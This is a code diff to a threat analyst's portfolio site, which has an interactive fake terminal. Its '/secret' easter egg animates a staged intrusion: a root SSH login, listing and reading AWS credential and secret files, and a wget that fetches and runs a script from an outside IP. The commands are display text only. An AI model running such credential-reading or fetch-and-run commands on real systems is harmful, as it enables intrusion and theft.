@@ -240,7 +240,7 @@
   // ── Startup animation script ──
   const STARTUP_SCRIPT: Array<{ type: 'prompt' | 'output'; text: string; delay?: number }> = [
     { type: 'prompt', text: 'whoami' },
-    { type: 'output', text: '<span class="t-highlight">Austin Larsen</span> — Principal Threat Analyst @ Google Threat Intelligence Group' },
+    { type: 'output', text: '<span class="t-highlight">Austin Larsen<\/span> — Principal Threat Analyst @ Google Threat Intelligence Group' },
     { type: 'output', text: '' },
   ];
 
@@ -249,152 +249,152 @@
     '/help': {
       description: 'List available commands',
       action: () => [
-        '<span class="t-highlight">Available commands:</span>',
+        '<span class="t-highlight">Available commands:<\/span>',
         '',
-        '  <span class="t-command">/threats</span>    — List tracked threat groups',
-        '  <span class="t-command">/research</span>   — Jump to research section',
-        '  <span class="t-command">/talks</span>      — Jump to talks section',
-        '  <span class="t-command">/blog</span>       — Go to blog',
-        '  <span class="t-command">/signal</span>     — Open Signal contact',
-        '  <span class="t-command">/linkedin</span>   — Open LinkedIn profile',
-        '  <span class="t-command">/twitter</span>    — Open Twitter / X profile',
-        '  <span class="t-command">/github</span>     — Open GitHub profile',
-        '  <span class="t-command">/tips</span>       — Submit a tip',
-        '  <span class="t-command">/clear</span>      — Clear terminal',
+        '  <span class="t-command">/threats<\/span>    — List tracked threat groups',
+        '  <span class="t-command">/research<\/span>   — Jump to research section',
+        '  <span class="t-command">/talks<\/span>      — Jump to talks section',
+        '  <span class="t-command">/blog<\/span>       — Go to blog',
+        '  <span class="t-command">/signal<\/span>     — Open Signal contact',
+        '  <span class="t-command">/linkedin<\/span>   — Open LinkedIn profile',
+        '  <span class="t-command">/twitter<\/span>    — Open Twitter / X profile',
+        '  <span class="t-command">/github<\/span>     — Open GitHub profile',
+        '  <span class="t-command">/tips<\/span>       — Submit a tip',
+        '  <span class="t-command">/clear<\/span>      — Clear terminal',
         '',
-        '  <span class="t-error">/[REDACTED]</span>  — <span class="t-error">TLP:RED</span>',
+        '  <span class="t-error">/[REDACTED]<\/span>  — <span class="t-error">TLP:RED<\/span>',
       ],
     },
     '/threats': {
       description: 'List tracked threat groups',
       action: () => [
-        '<span class="t-highlight">Tracked threat groups:</span>',
+        '<span class="t-highlight">Tracked threat groups:<\/span>',
         '',
-        '  <span class="t-unc">UNC5537</span>      Snowflake customer data theft & extortion',
-        '  <span class="t-unc">UNC4841</span>      Barracuda ESG zero-day exploitation',
-        '  <span class="t-unc">UNC4899</span>      DPRK supply chain compromise (JumpCloud)',
-        '  <span class="t-unc">UNC1069</span>      DPRK supply chain compromise (Axios NPM)',
-        '  <span class="t-unc">ShinyHunters</span> SaaS platform data theft campaigns',
+        '  <span class="t-unc">UNC5537<\/span>      Snowflake customer data theft & extortion',
+        '  <span class="t-unc">UNC4841<\/span>      Barracuda ESG zero-day exploitation',
+        '  <span class="t-unc">UNC4899<\/span>      DPRK supply chain compromise (JumpCloud)',
+        '  <span class="t-unc">UNC1069<\/span>      DPRK supply chain compromise (Axios NPM)',
+        '  <span class="t-unc">ShinyHunters<\/span> SaaS platform data theft campaigns',
       ],
     },
     '/signal': {
       description: 'Open Signal contact',
       action: () => {
         window.open('https://signal.me/#eu/B9Xfu0Xy5yiT_bunPy9GMuz8XqT0B-zcyd8pJtYuROPE8CpyVaJNZq78ckSNXUNV', '_blank');
-        return ['<span class="t-success">Opening Signal...</span>'];
+        return ['<span class="t-success">Opening Signal...<\/span>'];
       },
     },
     '/linkedin': {
       description: 'Open LinkedIn profile',
       action: () => {
         window.open('https://www.linkedin.com/in/austin-larsen/', '_blank');
-        return ['<span class="t-success">Opening LinkedIn...</span>'];
+        return ['<span class="t-success">Opening LinkedIn...<\/span>'];
       },
     },
     '/twitter': {
       description: 'Open Twitter / X profile',
       action: () => {
         window.open('https://twitter.com/AustinLarsen_', '_blank');
-        return ['<span class="t-success">Opening Twitter / X...</span>'];
+        return ['<span class="t-success">Opening Twitter / X...<\/span>'];
       },
     },
     '/github': {
       description: 'Open GitHub profile',
       action: () => {
         window.open('https://github.com/austin-larsen', '_blank');
-        return ['<span class="t-success">Opening GitHub...</span>'];
+        return ['<span class="t-success">Opening GitHub...<\/span>'];
       },
     },
     '/tips': {
       description: 'Open security tips document',
       action: () => {
         window.open('https://forms.gle/kzG5ja6DSDQQxitGA', '_blank');
-        return ['<span class="t-success">Opening security tips...</span>'];
+        return ['<span class="t-success">Opening security tips...<\/span>'];
       },
     },
     '/research': {
       description: 'Jump to research section',
       action: () => {
         document.getElementById('research')?.scrollIntoView({ behavior: 'smooth' });
-        return ['<span class="t-success">Scrolling to research...</span>'];
+        return ['<span class="t-success">Scrolling to research...<\/span>'];
       },
     },
     '/talks': {
       description: 'Jump to talks section',
       action: () => {
         document.getElementById('talks')?.scrollIntoView({ behavior: 'smooth' });
-        return ['<span class="t-success">Scrolling to talks...</span>'];
+        return ['<span class="t-success">Scrolling to talks...<\/span>'];
       },
     },
     '/blog': {
       description: 'Go to blog',
       action: () => {
         window.location.href = '/blog';
-        return ['<span class="t-success">Navigating to blog...</span>'];
+        return ['<span class="t-success">Navigating to blog...<\/span>'];
       },
     },
     '/secret': {
       description: 'TLP:RED',
       action: () => {
         const seq: [number, () => void][] = [
-          [200,  () => { addOutput('<span class="t-output">ssh root@185.220.101.47 -p 22</span>'); scrollToBottom(); }],
-          [700,  () => { addOutput('<span class="t-output">The authenticity of host \'185.220.101.47\' can\'t be established.</span>'); scrollToBottom(); }],
-          [900,  () => { addOutput('<span class="t-output">ED25519 key fingerprint is SHA256:kT3/Rq9mXzPl0vN8Yw2uBcJhF4iKdLsOeAmGn1QpXr=</span>'); scrollToBottom(); }],
-          [1100, () => { addOutput('<span class="t-output">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>'); scrollToBottom(); }],
-          [1400, () => { addOutput('<span class="t-output">Warning: Permanently added \'185.220.101.47\' (ED25519) to the list of known hosts.</span>'); scrollToBottom(); }],
-          [1700, () => { addOutput('<span class="t-output">root@185.220.101.47\'s password: <span class="t-cursor"></span></span>'); scrollToBottom(); }],
-          [2400, () => { addOutput('<span class="t-error">Permission denied, please try again.</span>'); scrollToBottom(); }],
-          [2700, () => { addOutput('<span class="t-output">root@185.220.101.47\'s password: <span class="t-cursor"></span></span>'); scrollToBottom(); }],
-          [3400, () => { addOutput('<span class="t-error">Permission denied, please try again.</span>'); scrollToBottom(); }],
-          [3700, () => { addOutput('<span class="t-output">root@185.220.101.47\'s password: <span class="t-cursor"></span></span>'); scrollToBottom(); }],
-          [4600, () => { addOutput('<span class="t-success">Access granted.</span>'); scrollToBottom(); }],
+          [200,  () => { addOutput('<span class="t-output">ssh root@185.220.101.47 -p 22<\/span>'); scrollToBottom(); }],
+          [700,  () => { addOutput('<span class="t-output">The authenticity of host \'185.220.101.47\' can\'t be established.<\/span>'); scrollToBottom(); }],
+          [900,  () => { addOutput('<span class="t-output">ED25519 key fingerprint is SHA256:kT3/Rq9mXzPl0vN8Yw2uBcJhF4iKdLsOeAmGn1QpXr=<\/span>'); scrollToBottom(); }],
+          [1100, () => { addOutput('<span class="t-output">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<\/span>'); scrollToBottom(); }],
+          [1400, () => { addOutput('<span class="t-output">Warning: Permanently added \'185.220.101.47\' (ED25519) to the list of known hosts.<\/span>'); scrollToBottom(); }],
+          [1700, () => { addOutput('<span class="t-output">root@185.220.101.47\'s password: <span class="t-cursor"><\/span><\/span>'); scrollToBottom(); }],
+          [2400, () => { addOutput('<span class="t-error">Permission denied, please try again.<\/span>'); scrollToBottom(); }],
+          [2700, () => { addOutput('<span class="t-output">root@185.220.101.47\'s password: <span class="t-cursor"><\/span><\/span>'); scrollToBottom(); }],
+          [3400, () => { addOutput('<span class="t-error">Permission denied, please try again.<\/span>'); scrollToBottom(); }],
+          [3700, () => { addOutput('<span class="t-output">root@185.220.101.47\'s password: <span class="t-cursor"><\/span><\/span>'); scrollToBottom(); }],
+          [4600, () => { addOutput('<span class="t-success">Access granted.<\/span>'); scrollToBottom(); }],
           [4900, () => { addOutput(''); scrollToBottom(); }],
-          [5000, () => { addOutput('<span class="t-label">Last login: Sat Mar 29 03:14:07 2025 from 91.108.4.0</span>'); scrollToBottom(); }],
+          [5000, () => { addOutput('<span class="t-label">Last login: Sat Mar 29 03:14:07 2025 from 91.108.4.0<\/span>'); scrollToBottom(); }],
           [5100, () => { addOutput(''); scrollToBottom(); }],
-          [5150, () => { addOutput('<span class="t-error">╔══════════════════════════════════════════════════════════╗</span>'); scrollToBottom(); }],
-          [5200, () => { addOutput('<span class="t-error">║         *** UNAUTHORIZED ACCESS PROHIBITED ***           ║</span>'); scrollToBottom(); }],
-          [5250, () => { addOutput('<span class="t-error">║                                                          ║</span>'); scrollToBottom(); }],
-          [5300, () => { addOutput('<span class="t-error">║  This system is for authorized users only. All activity  ║</span>'); scrollToBottom(); }],
-          [5350, () => { addOutput('<span class="t-error">║  is monitored, logged, and subject to audit. Disconnect  ║</span>'); scrollToBottom(); }],
-          [5400, () => { addOutput('<span class="t-error">║  immediately if you are not an authorized user.          ║</span>'); scrollToBottom(); }],
-          [5450, () => { addOutput('<span class="t-error">║                                                          ║</span>'); scrollToBottom(); }],
-          [5500, () => { addOutput('<span class="t-error">║  Violations may be prosecuted under 18 U.S.C § 1030     ║</span>'); scrollToBottom(); }],
-          [5550, () => { addOutput('<span class="t-error">╚══════════════════════════════════════════════════════════╝</span>'); scrollToBottom(); }],
+          [5150, () => { addOutput('<span class="t-error">╔══════════════════════════════════════════════════════════╗<\/span>'); scrollToBottom(); }],
+          [5200, () => { addOutput('<span class="t-error">║         *** UNAUTHORIZED ACCESS PROHIBITED ***           ║<\/span>'); scrollToBottom(); }],
+          [5250, () => { addOutput('<span class="t-error">║                                                          ║<\/span>'); scrollToBottom(); }],
+          [5300, () => { addOutput('<span class="t-error">║  This system is for authorized users only. All activity  ║<\/span>'); scrollToBottom(); }],
+          [5350, () => { addOutput('<span class="t-error">║  is monitored, logged, and subject to audit. Disconnect  ║<\/span>'); scrollToBottom(); }],
+          [5400, () => { addOutput('<span class="t-error">║  immediately if you are not an authorized user.          ║<\/span>'); scrollToBottom(); }],
+          [5450, () => { addOutput('<span class="t-error">║                                                          ║<\/span>'); scrollToBottom(); }],
+          [5500, () => { addOutput('<span class="t-error">║  Violations may be prosecuted under 18 U.S.C § 1030     ║<\/span>'); scrollToBottom(); }],
+          [5550, () => { addOutput('<span class="t-error">╚══════════════════════════════════════════════════════════╝<\/span>'); scrollToBottom(); }],
           [5700, () => { addOutput(''); scrollToBottom(); }],
-          [5800, () => { addOutput('<span class="t-label">Initializing session audit log... done</span>'); scrollToBottom(); }],
-          [6000, () => { addOutput('<span class="t-label">Loading environment... done</span>'); scrollToBottom(); }],
-          [6200, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# whoami</span>'); scrollToBottom(); }],
-          [6600, () => { addOutput('<span class="t-error">root</span>'); scrollToBottom(); }],
-          [6900, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# uname -a</span>'); scrollToBottom(); }],
-          [7300, () => { addOutput('<span class="t-output">Linux c2-node-03 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux</span>'); scrollToBottom(); }],
-          [7600, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# ls /home/deploy/.aws/ /opt/app/config/ /var/run/secrets/ 2>/dev/null</span>'); scrollToBottom(); }],
-          [8100, () => { addOutput('<span class="t-output">/home/deploy/.aws/:</span>'); scrollToBottom(); }],
-          [8200, () => { addOutput('<span class="t-success">credentials&nbsp;&nbsp;&nbsp;&nbsp;config</span>'); scrollToBottom(); }],
-          [8350, () => { addOutput('<span class="t-output">/opt/app/config/:</span>'); scrollToBottom(); }],
-          [8450, () => { addOutput('<span class="t-success">database.yml&nbsp;&nbsp;secrets.env&nbsp;&nbsp;jwt_signing.key</span>'); scrollToBottom(); }],
-          [8600, () => { addOutput('<span class="t-output">/var/run/secrets/:</span>'); scrollToBottom(); }],
-          [8700, () => { addOutput('<span class="t-success">k8s-sa-token&nbsp;&nbsp;tls.crt&nbsp;&nbsp;tls.key</span>'); scrollToBottom(); }],
-          [9000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# cat /home/deploy/.aws/credentials</span>'); scrollToBottom(); }],
-          [9500, () => { addOutput('<span class="t-output">[default]</span>'); scrollToBottom(); }],
-          [9600, () => { addOutput('<span class="t-output">aws_access_key_id     = AKIA█████████████████</span>'); scrollToBottom(); }],
-          [9700, () => { addOutput('<span class="t-output">aws_secret_access_key = ████████████████████████████████████████</span>'); scrollToBottom(); }],
-          [10000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# wget -q http://185.220.101.47:8080/update.py -O /tmp/ld.py && chmod +x /tmp/ld.py</span>'); scrollToBottom(); }],
-          [11000, () => { addOutput('<span class="t-success">Saving to: '/tmp/ld.py'</span>'); scrollToBottom(); }],
-          [11200, () => { addOutput('<span class="t-success">/tmp/ld.py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%[=============================>]&nbsp;&nbsp;4.31K&nbsp;&nbsp;--.-KB/s&nbsp;&nbsp;in 0.001s</span>'); scrollToBottom(); }],
-          [11500, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# nohup python3 /tmp/ld.py &>/dev/null &</span>'); scrollToBottom(); }],
-          [11800, () => { addOutput('<span class="t-output">[1] 31337</span>'); scrollToBottom(); }],
-          [12000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~#</span>'); scrollToBottom(); }],
+          [5800, () => { addOutput('<span class="t-label">Initializing session audit log... done<\/span>'); scrollToBottom(); }],
+          [6000, () => { addOutput('<span class="t-label">Loading environment... done<\/span>'); scrollToBottom(); }],
+          [6200, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# whoami<\/span>'); scrollToBottom(); }],
+          [6600, () => { addOutput('<span class="t-error">root<\/span>'); scrollToBottom(); }],
+          [6900, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# uname -a<\/span>'); scrollToBottom(); }],
+          [7300, () => { addOutput('<span class="t-output">Linux c2-node-03 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux<\/span>'); scrollToBottom(); }],
+          [7600, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# ls /home/deploy/.aws/ /opt/app/config/ /var/run/secrets/ 2>/dev/null<\/span>'); scrollToBottom(); }],
+          [8100, () => { addOutput('<span class="t-output">/home/deploy/.aws/:<\/span>'); scrollToBottom(); }],
+          [8200, () => { addOutput('<span class="t-success">credentials&nbsp;&nbsp;&nbsp;&nbsp;config<\/span>'); scrollToBottom(); }],
+          [8350, () => { addOutput('<span class="t-output">/opt/app/config/:<\/span>'); scrollToBottom(); }],
+          [8450, () => { addOutput('<span class="t-success">database.yml&nbsp;&nbsp;secrets.env&nbsp;&nbsp;jwt_signing.key<\/span>'); scrollToBottom(); }],
+          [8600, () => { addOutput('<span class="t-output">/var/run/secrets/:<\/span>'); scrollToBottom(); }],
+          [8700, () => { addOutput('<span class="t-success">k8s-sa-token&nbsp;&nbsp;tls.crt&nbsp;&nbsp;tls.key<\/span>'); scrollToBottom(); }],
+          [9000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# cat /home/deploy/.aws/credentials<\/span>'); scrollToBottom(); }],
+          [9500, () => { addOutput('<span class="t-output">[default]<\/span>'); scrollToBottom(); }],
+          [9600, () => { addOutput('<span class="t-output">aws_access_key_id     = AKIA█████████████████<\/span>'); scrollToBottom(); }],
+          [9700, () => { addOutput('<span class="t-output">aws_secret_access_key = ████████████████████████████████████████<\/span>'); scrollToBottom(); }],
+          [10000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# wget -q http://185.220.101.47:8080/update.py -O /tmp/ld.py && chmod +x /tmp/ld.py<\/span>'); scrollToBottom(); }],
+          [11000, () => { addOutput('<span class="t-success">Saving to: \u2018/tmp/ld.py\u2019<\/span>'); scrollToBottom(); }],
+          [11200, () => { addOutput('<span class="t-success">/tmp/ld.py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%[=============================>]&nbsp;&nbsp;4.31K&nbsp;&nbsp;--.-KB/s&nbsp;&nbsp;in 0.001s<\/span>'); scrollToBottom(); }],
+          [11500, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# nohup python3 /tmp/ld.py &>/dev/null &<\/span>'); scrollToBottom(); }],
+          [11800, () => { addOutput('<span class="t-output">[1] 31337<\/span>'); scrollToBottom(); }],
+          [12000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~#<\/span>'); scrollToBottom(); }],
           [12300, () => { triggerSecretMode(); }],
         ];
         seq.forEach(([delay, fn]) => setTimeout(fn, delay));
-        return ['<span class="t-output">Connecting to 185.220.101.47...</span>'];
+        return ['<span class="t-output">Connecting to 185.220.101.47...<\/span>'];
       },
     },
     '/restore': {
       description: 'Restore normal operation',
       action: () => {
         document.dispatchEvent(new CustomEvent('secret-restore'));
-        return ['<span class="t-success">Systems nominal. Chaos contained.</span>'];
+        return ['<span class="t-success">Systems nominal. Chaos contained.<\/span>'];
       },
     },
     '/clear': {
@@ -505,7 +505,7 @@
 
     if (cmd === '/clear') {
       body.innerHTML = '';
-      addOutput('<span class="t-highlight">Type /help for available commands</span>');
+      addOutput('<span class="t-highlight">Type /help for available commands<\/span>');
       scrollToBottom();
       return;
     }
@@ -522,8 +522,8 @@
         output.forEach(line => addOutput(line));
       }
     } else {
-      addOutput(`<span class="t-error">command not found: ${cmd.replace(/</g, '&lt;')}</span>`);
-      addOutput('Type <span class="t-command">/help</span> for available commands');
+      addOutput(`<span class="t-error">command not found: ${cmd.replace(/</g, '&lt;')}<\/span>`);
+      addOutput('Type <span class="t-command">/help<\/span> for available commands');
     }
 
     scrollToBottom();
@@ -616,11 +616,20 @@
     // Banner
     const banner = document.createElement('div');
     banner.id = 'secret-banner';
-    banner.innerHTML = `
-      <div class="sb-label">// root@corp-prod-db01 · SESSION ACTIVE · TLP:RED</div>
-      <div class="sb-title">SYSTEM<br>COMPROMISED</div>
-      <div class="sb-sub">18 U.S.C § 1030 · All activity logged · <kbd>ESC</kbd> or <span>/restore</span> to disconnect</div>
-    `;
+    const bLabel = document.createElement('div');
+    bLabel.className = 'sb-label';
+    bLabel.textContent = '// root@corp-prod-db01 · SESSION ACTIVE · TLP:RED';
+    const bTitle = document.createElement('div');
+    bTitle.className = 'sb-title';
+    bTitle.innerHTML = 'SYSTEM<br>COMPROMISED';
+    const bSub = document.createElement('div');
+    bSub.className = 'sb-sub';
+    const kbd = document.createElement('kbd');
+    kbd.textContent = 'ESC';
+    const restoreSpan = document.createElement('span');
+    restoreSpan.textContent = '/restore';
+    bSub.append('18 U.S.C § 1030 · All activity logged · ', kbd, ' or ', restoreSpan, ' to disconnect');
+    banner.append(bLabel, bTitle, bSub);
     document.body.appendChild(banner);
     document.body.classList.add('secret-mode');
 
